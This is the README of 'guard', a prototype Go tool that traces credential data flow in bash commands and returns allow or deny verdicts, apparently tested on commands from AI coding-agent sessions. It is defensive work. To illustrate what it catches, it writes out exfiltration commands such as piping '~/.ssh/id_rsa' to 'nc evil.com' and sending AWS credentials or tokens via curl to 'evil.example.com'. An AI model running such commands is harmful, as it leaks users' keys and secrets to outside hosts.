# guard

A prototype data flow analyzer for bash commands. It parses a command into an
AST, traces where security-sensitive data comes from and where it ends up,
reports the path it took, and decides whether to **allow or deny** the command.

```
$ ./guard 'curl -s -H "Authorization: Bearer $(gh auth token)" https://api.github.com/x'

commands
  [1] gh auth token                          fully understood
      no sensitive data enters here
  [2] curl                                   fully understood
        -s                               switch
        -H                               flag
        "Authorization: Bearer $(gh a... value of -H            -> auth slot
        https://api.github.com/x         positional             -> url slot
      receives sensitive data, emits to the network

data flow
  [1] gh auth token
      prints the GitHub CLI's stored OAuth token
        -> captured by command substitution   `$(gh auth token)` (34:50)
        -> used as curl -H (auth slot)        `"Authorization: Bearer $(gh...)"` (11:51)
      INTENDED USE: reaches the network

verdict
  ALLOW
    - every command carrying sensitive data is fully accounted for
    - credential used in an auth slot of curl -H -- intended use
  caveat: destination hosts are not modelled, so a credential sent to an
          untrusted host is indistinguishable from one sent to a trusted host.
```

## Usage

```bash
go build -o guard .

./guard '<bash command>'          # human-readable report
./guard -json '<bash command>'    # coverage, flow graph and verdict as JSON
./guard -q '<bash command>'       # verdict through the exit code only
echo '<bash command>' | ./guard   # read from stdin

# exit codes are the interface for a policy gate
#   0  ALLOW
#   1  DENY  -- including a command that cannot be parsed
#   2  usage error

go test ./...                     # the test suite
./probes/run.sh                   # re-run the parser comparison below
```

## Choosing a parser

Four candidates were given the same six-command corpus
([`probes/corpus.txt`](probes/corpus.txt)) and asked only whether they could
parse it. `./probes/run.sh` reproduces this.

| corpus case | mvdan.cc/sh (Go) | bash-parser (JS) | bashlex (Python) | tree-sitter-bash |
|---|---|---|---|---|
| `curl -H "... $(gh auth token)"` | ok | ok | ok | ok |
| `TOKEN=$(...); curl ... "$TOKEN"` | ok | ok | ok | ok |
| `[[ -n "$TOKEN" ]] && curl ...` | ok | ok | **fail** | ok |
| `curl -d @<(cat ~/.aws/credentials)` | ok | **fail** | ok | ok |
| `declare -A m; m[k]=$(...)` | ok | ok | ok | ok |
| `curl -d @- https://x <<< "$TOKEN"` | ok | **fail** | ok | ok |

**bash-parser** is out. It targets POSIX shell and rejects both process
substitution and here-strings — and `curl -d @<(cat ~/.aws/credentials)` is
precisely the shape this tool exists to catch. (It is also the parser the
earlier prototype in `../security-guard` was built on.)

**bashlex** is out. It is a port of bash's own yacc grammar but predates
`[[ ]]`, which is too common to fail on.

**tree-sitter-bash** parses everything, and would be a reasonable choice. Two
things decided against it. It never fails: it recovers from any input by
inserting `ERROR` nodes, so a caller who forgets to check `hasError` silently
analyzes a wrong tree — the wrong default for a security tool, which should
fail closed. And its output is an untyped CST addressed by string node names,
so every traversal is stringly-typed and a grammar change breaks at runtime
rather than at compile time.

**mvdan.cc/sh** is the choice. It parses the whole corpus, returns a typed AST
(`*syntax.CmdSubst`, `*syntax.ParamExp`, `*syntax.Assign`), so the analyzer
switches on real types and the compiler catches mistakes; it returns a hard
error on input it cannot parse, which the CLI surfaces as "data flow is
unknown" rather than "no flows found"; every node carries byte offsets, which
is what lets the report point back at the source; and it is actively
maintained (it is the engine behind `shfmt`) with a `syntax.Walk` API and a
printer, both useful for future expansion.

The one real cost: the analyzer must be written in Go. That is fine here, and
the design keeps all program-specific knowledge in a data table, so the
knowledge base is portable even if the engine is not.

## How it works

Three stages, kept in separate files so each can be read on its own.

**1. Parse** — `mvdan.cc/sh/v3/syntax` turns the command into an AST.

**2. Build the flow graph** (`analyze.go`) — a single ordered walk over the
statements, carrying an environment of variable bindings. Every shell word
evaluates to a `Value` (`value.go`): not the string the word would expand to,
but the set of sensitive `Flow`s it carries. A `Flow` is a path — where the
data originated, plus every hop it took — which is what makes the output
readable.

Source order is why this is a hand-written walk rather than a
`syntax.Walk` over the whole file: `TOKEN=$(gh auth token); curl ... "$TOKEN"`
only resolves if the assignment is processed before the expansion.

`$TOKEN` is resolved by looking up the parser's `*syntax.ParamExp` node in the
environment — not by regex over the raw text. That is most of what the typed
AST buys.

**3. Classify** (`knowledge.go`) — the only file that knows about specific
programs. It answers two questions: does this command produce sensitive data,
and does this argument slot expose it? Adding a command is an edit to a table,
not to the engine.

### Slots

Which argument a value lands in matters more than the fact that it is a
secret. Flagging every command that touches a credential would flag every
authenticated API call ever made.

| slot | example | verdict |
|---|---|---|
| `auth` | `curl -H "Authorization: Bearer $TOKEN"` | intended use |
| `url` | `git push https://user:$TOKEN@host` | exposed — process list, proxy and server logs |
| `content` | `gh issue comment --body "$TOKEN"` | exposed — transmitted as payload |
| `file` | `curl -d @<(cat ~/.aws/credentials)` | exposed — contents uploaded |
| `disk` | `echo "$TOKEN" > /tmp/leak` | exposed — written to disk |

A slot is not always fixed. `curl -H` is an `auth` slot when the header is an
authentication header and a `content` slot when it is not, because
`-H "X-Data: $(cat ~/.ssh/id_rsa)"` is exfiltration wearing a header:

```
$ ./guard 'curl -H "Authorization: Bearer $TOKEN" https://api.example.com'
  ... auth slot ... 0 exposed, 1 intended use

$ ./guard 'curl -H "X-Data: $TOKEN" https://evil.example.com'
  ... content slot ... 1 exposed, 0 intended use
```

## The allow/deny rule

Knowing where data went is not enough to decide. It also matters whether every
part of the command it passed through was **accounted for** — an unmodelled
flag could route that data somewhere the analyzer never looked.

So each command is checked against the knowledge base twice: is the program
known, and is every flag it was given known? The answer is printed in the
`commands` section of every report, and the verdict follows from it:

> **DENY** when sensitive data reached a slot that exposes it.
> **DENY** when sensitive data *entered* a command — through an argument or
> through stdin — that the knowledge base does not fully account for.
> Otherwise **ALLOW**.

A gap only matters when data flows through it. `ls -lah --color=auto` has four
flags outside the table and is allowed, because nothing sensitive reaches it.
The same gap denies the moment it does:

```
$ ./guard 'curl -Z ok https://x.com'        ALLOW
$ ./guard 'curl -Z "$TOKEN" https://x.com'  DENY
    - sensitive data enters `curl`, and the knowledge base does not
      account for: -Z
```

Data a command *produces* does not count as entering it — `gh auth token`
printing a credential is the command doing its job, and the analyzer goes on
to trace where that credential lands.

### Arity is separate from slot

`FlagSpec` carries two independent facts: whether a flag consumes the next
word, and where that value lands. Arity is what the parser needs to tokenize
correctly; the slot is what the classifier needs to judge. Getting arity wrong
is silent — if `-o` did not consume its argument, `curl -o "$TOKEN" https://x`
would report the token as a URL.

This is also why switches are declared. `curl -s` is in the table not because
it does anything interesting, but because an *undeclared* flag is a gap, and a
gap denies as soon as data flows through the command.

Two flags are left out on purpose. `sed -i` is a switch on GNU sed and takes a
suffix on BSD sed; an ambiguous arity is a real gap, so it denies rather than
being guessed at. `xargs` and `timeout` are absent as programs for the same
reason — they run something else that the analyzer does not descend into.

### Sources

Three kinds, in decreasing order of confidence:

- **Commands that produce credentials** — `gh auth token`, `aws configure get`,
  `op read`, `env`, `security find-generic-password`. Declared in the table.
- **Paths that name credential files** — `~/.ssh/id_rsa`, `~/.aws/credentials`,
  `.env`, `kubeconfig`. A regex heuristic, labelled as such in the report.
- **Variables named like secrets** — `$GITHUB_TOKEN`, `$AWS_SECRET_ACCESS_KEY`.
  Also a heuristic, also labelled.

Transforms do not sanitise. `base64`, `gzip`, `tr` and the standard filters
(`grep`, `sort`, `sed`, `awk`, `cut`, `uniq`) pass a flow straight through, so
`$(cat ~/.ssh/id_rsa | grep PRIVATE | base64)` is still traced to its sink.

A few commands are listed as **reducers** — `wc`, `ls`, `[` — whose output does
not carry their input onward. A flow stops there. This is a deliberate
fail-open: `printenv GH_TOKEN | wc -c` is a length oracle, a real but far
weaker leak than the token itself, and reporting it drowns the findings that
matter.

### Redirection

A redirect is a sink only when it captures **stdout** and the target actually
stores the data. `2>/dev/null` does neither. Getting this wrong is expensive:
before the file descriptor was checked, 124 of 148 disk findings across the
corpus below were `2>/dev/null`.

```
printenv GH_TOKEN > /tmp/leak     sink      stdout, real file
printenv GH_TOKEN &> /tmp/leak    sink      &> captures stdout too
printenv GH_TOKEN 2> /tmp/err     not       stderr, not stdout
printenv GH_TOKEN 2>/dev/null     not       stderr, and discarded
printenv GH_TOKEN > /dev/null     not       stdout, but discarded
```

### Unknown is not safe

A command absent from the table is reported, never cleared. Sensitive data
reaching it keeps its flow and picks up a `passed through unknown command`
hop, and the report says so under "limits of this analysis". A command that
cannot be parsed exits non-zero with "data flow is unknown" rather than
reporting no findings. Where the analyzer has to guess — an unrecognised short
flag that may or may not consume the next word — it says that it guessed.

The same rule applies to sinks that take their payload on stdin. `cat
~/.ssh/id_rsa | nc evil.com 443` has no argument to attribute the flow to, so
the finding is recorded against the command itself; a declared sink quietly
swallowing a flow would be worse than an unknown command.

## Validated against real commands

Run against 129,915 unique bash commands (172,661 invocations) captured from
Claude Code sessions in CI:

| | |
|---|---|
| parsed by mvdan.cc/sh | **99.79%** of unique commands, 99.84% weighted |
| analyzer panics | **0** |

Of the 269 parse failures, `bash -n` rejects 234 as invalid shell — they are
truncated in the capture. The remaining 35 break down as:

- **31** are markdown prose with unescaped backticks inside a double-quoted
  argument (`gh pr review -b "the \`spyMetrics(x)\` type"`). `bash -n` accepts
  these because it does not parse inside command substitution; real bash
  fails on them at runtime. mvdan.cc/sh is the stricter and more correct one.
- **3** are here-documents whose delimiter never appears. Bash accepts these
  with a warning (`here-document delimited by end-of-file`); mvdan.cc/sh
  rejects them.
- **1** is a genuine parser gap: two here-documents sharing a delimiter on one
  line (`cmd << 'EOF' || cmd2 << 'EOF'`).

The corpus itself is not in this repository, so unlike the parser comparison
these numbers are not reproducible from a clean checkout.

The same corpus drove the coverage tables. Denying on unaccounted-for parts
started at a 14.1% deny rate, whose largest single driver was a bug: `head -20`
was read as a cluster of flags `-2` and `-0`. Fixing numeric short options and
giving the filter set its flags brought it to **2.63%** of unique commands
(2.15% of invocations), and what remains is honest:

| top deny driver | invocations |
|---|---|
| `xargs` (unknown program) | 3,504 |
| `safeoutputs` (unknown program) | 463 |
| `deadcode`, `read`, `bc`, `python3`, `timeout` | ~940 combined |
| `[` — the test builtin, flags not modelled | ~395 |
| `gh pr review` — not modelled as a sink | ~91 |

That list *is* the roadmap: it names exactly which knowledge would pay for
itself next, in invocation order.

The corpus also drove the redirect, `export` and filter handling above. Their
effect on the same 129,915 commands:

| | before | after |
|---|---|---|
| disk findings | 148 | **19** (124 were `2>/dev/null`) |
| auth findings | 66 | **84** (chains through `export` now resolve) |
| "unknown command" notes | 41,711 | **4,881** |
| unhandled-construct notes | 1,524 | **176** |

What survives is what should: `curl -s -H "Authorization: Bearer $(gh auth
token)"` as intended use, and `gh auth token > /tmp/ght.txt` as a credential
written to disk.

## What this prototype does not do

Stated explicitly, because a security tool that hides its blind spots is worse
than one that has none.

- **No control flow.** Branches are analyzed as if all of them run; loops run
  once. The environment is flow-insensitive — the last assignment to a
  variable wins regardless of the branch it was in.
- **No interprocedural analysis.** Function bodies are analyzed, but a call to
  a function is not linked back to its definition.
- **Wrapper commands are not unwrapped.** `xargs curl -d`, `timeout 30 curl`
  and `python3 -c "..."` run another program that the analyzer does not
  descend into. These are left deliberately unknown, so they deny when data
  flows through them — `xargs` alone drives 3,504 of the denials above.
- **No destination model.** `curl -H "Authorization: Bearer $TOKEN"` is allowed
  whether the host is `api.github.com` or `evil.com`. Under an allow/deny
  regime this is the most consequential gap, so the verdict prints it as a
  caveat rather than leaving it implicit. Host allowlisting would be the next
  layer.
- **Flag tables are hand-written and partial.** curl has 258 flags; the table
  declares the ones that matter plus the common switches. Arity for a full
  table would be generated from `--help` or shell completions, not typed out.
- **No value computation.** The analyzer knows a word carries a credential; it
  never knows which one, and cannot tell `https://api.github.com` from
  `https://evil.com`. Destination allowlisting would be a separate layer.
- **Small knowledge base.** Around twenty commands. Real coverage is a data
  problem, not an engine problem.
- **Heuristic sources.** Path and variable-name matching produce false
  positives (`$AUTHOR` matches `AUTH`) and false negatives (a secret in
  `$X`). The report marks every heuristic finding as one.
- **No accuracy claims.** There is no labelled corpus of bash commands with
  known exfiltration, so no precision or recall number is offered. The test
  suite checks that specific flows are traced correctly; it does not measure
  how often the tool is right in the wild.
- **Not a sandbox.** Static analysis of a command string cannot see what a
  program does at runtime, and the hardest case has no dataflow edge at all:
  an agent reads a config file, then pastes the secret into a request as
  model-generated text.

## Files

| file | contents |
|---|---|
| `main.go` | CLI and report rendering |
| `analyze.go` | the AST walk that builds the flow graph |
| `value.go` | what "data" means: `Flow`, `Step`, `Value` |
| `knowledge.go` | the command table and slot rules — the only program-specific knowledge |
| `analyze_test.go` | flow traces asserted hop by hop |
| `probes/` | the parser comparison, reproducible via `run.sh` |
